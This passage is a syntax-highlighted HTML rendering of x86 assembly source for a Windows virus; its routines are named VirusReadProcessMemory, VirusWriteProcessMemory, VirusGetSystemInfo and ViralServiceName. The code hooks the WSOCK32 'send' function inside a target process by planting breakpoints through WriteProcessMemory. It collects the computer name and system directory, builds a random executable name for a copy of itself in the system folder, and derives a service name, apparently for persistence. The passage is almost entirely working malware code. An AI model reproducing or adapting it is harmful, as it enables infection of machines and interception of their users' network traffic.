                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TargetThreadID</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">GotTheTrue</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">WindowNotFound</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000001h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">GotTheTrue</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;HookApiProvider</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">DEBUG_EVENT__LOAD_DLL</span><span class="sc0">       </span><span class="sc9">struc</span><span class="sc0">

</span><span class="sc5">dwProcessId</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dwThreadId</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  
</span><span class="sc5">hFile</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">lpBaseOfDll</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dwDebugInfoFileOffset</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">nDebugInfoSize</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">lpImageName</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">fUnicode</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">DEBUG_EVENT__LOAD_DLL</span><span class="sc0">       </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">HookApiProvider</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0"> </span><span class="sc1">;dwProcessId</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TargetProcessID</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NoHookOnThisDLL</span><span class="sc0">

                </span><span class="sc6">lodsd</span><span class="sc0"> </span><span class="sc1">;dwThreadId</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">lodsd</span><span class="sc0"> </span><span class="sc1">;hFile</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0"> </span><span class="sc1">;lpBaseOfDll</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;Avoid relocated dlls</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hWSOCK32</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NoHookOnThisDLL</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">IMAGE_DOS_HEADER.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffer__lfanew</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">VirusReadProcessMemory</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">NoHookOnThisDLL</span><span class="sc0">
                
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">NoHookOnThisDLL</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_FILE_HEADER</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffer__FileHeader</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">VirusReadProcessMemory</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">NoHookOnThisDLL</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_FILE_HEADER</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetCRC32</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CRC__Winsock</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NoHookOnThisDLL</span><span class="sc0">

                </span><span class="sc1">; EBX -&gt; WSOCK32 base address into</span><span class="sc0">
                </span><span class="sc1">;    address space of target process</span><span class="sc0">

                </span><span class="sc1">;Patch send ( WSOCK32 API)</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_send</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Org1Byte__send</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Save1stBytesOfAPI</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">NoHookOnThisDLL</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_send</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetBreakPointOnAPI</span><span class="sc0">

</span><span class="sc5">NoHookOnThisDLL</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Save 1st byte of API</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On entry:  eax &lt;- Address of API entry-point</span><span class="sc0">
</span><span class="sc1">;       esi &lt;- Buffer for the read byte</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">Save1stBytesOfAPI</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">SizeOfBreakpointAndRet04</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">VirusReadProcessMemory</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Set break-point on API</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On entry:  edi &lt;- Address of API entry-point</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">SetBreakPointOnAPI</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hTargetProcess</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">opcodeINT03</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">SizeOfBreakpointAndRet04</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">VirusWriteProcessMemory</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Remove break-point</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On entry:  esi &lt;- Ptr to original 1st byte of API code</span><span class="sc0">
</span><span class="sc1">;       edi &lt;- Address of API entry-point</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">RemoveBreakPoint</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hTargetProcess</span><span class="sc4">]</span><span class="sc0">          
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">SizeOfBreakpointAndRet04</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">VirusWriteProcessMemory</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;VirusReadProcessMemory</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On entry:  eax -&gt; Pointer to the base address from which to read</span><span class="sc0">
</span><span class="sc1">;       ecx -&gt; Specifies the requested number of bytes to read</span><span class="sc0">
</span><span class="sc1">;       esi -&gt; Pointer to a buffer that receives the contents from </span><span class="sc0">
</span><span class="sc1">;              the address</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On exit:   eax -&gt; NULL if error</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       ebx, ecx, esi, edi, ebp preserved</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">VirusReadProcessMemory</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RPM_BytesRead</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hTargetProcess</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_ReadProcessMemory</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ExitREM</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ExitREM</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">ExitREM</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;VirusWriteProcessMemory</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On entry:  eax &lt;- Process handle</span><span class="sc0">
</span><span class="sc1">;       esi &lt;- Ptr to source</span><span class="sc0">
</span><span class="sc1">;       edi &lt;- Ptr to destination</span><span class="sc0">
</span><span class="sc1">;       ecx &lt;- Size</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On exit:   eax -&gt; NULL on error</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">VirusWriteProcessMemory</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WPM_BytesWritten</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_WriteProcessMemory</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">VWPMFailed</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WPM_BytesWritten</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">VWPMFailed</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_FlushInstructionCache</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">VWPMFailed</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;VirusGetSystemInfo</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On entry:  None</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On exit:   eax -&gt; NULL on error</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">VirusGetSystemInfo</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">system_version</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">00000094h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_GetVersionExA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">VirusGetSysInfoError</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Path_VirusCurrentFile</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_GetModuleFileNameA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">VirusGetSysInfoError</span><span class="sc0">
                        
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SizeOfComputerName</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000020h</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_GetComputerNameA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">VirusGetSysInfoError</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Path_SearchSystemDLL</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_GetSystemDirectoryA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">VirusGetSysInfoError</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc13">'D.*\'
</span><span class="sc0">                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00004C4Ch</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Path_VirusSystemFile</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">StringParser</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">;*</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szComputerName</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetStringCRC32</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetRangeRND</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000003h</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">LoopBuildNick</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'a'</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">     
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">LoopBuildNick</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">452E3233h</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00004558h</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc1">;*</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ViralServiceName</span><span class="sc0">
</span><span class="sc5">MakeViralServiceName</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2Eh</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">DoneViralServiceName</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
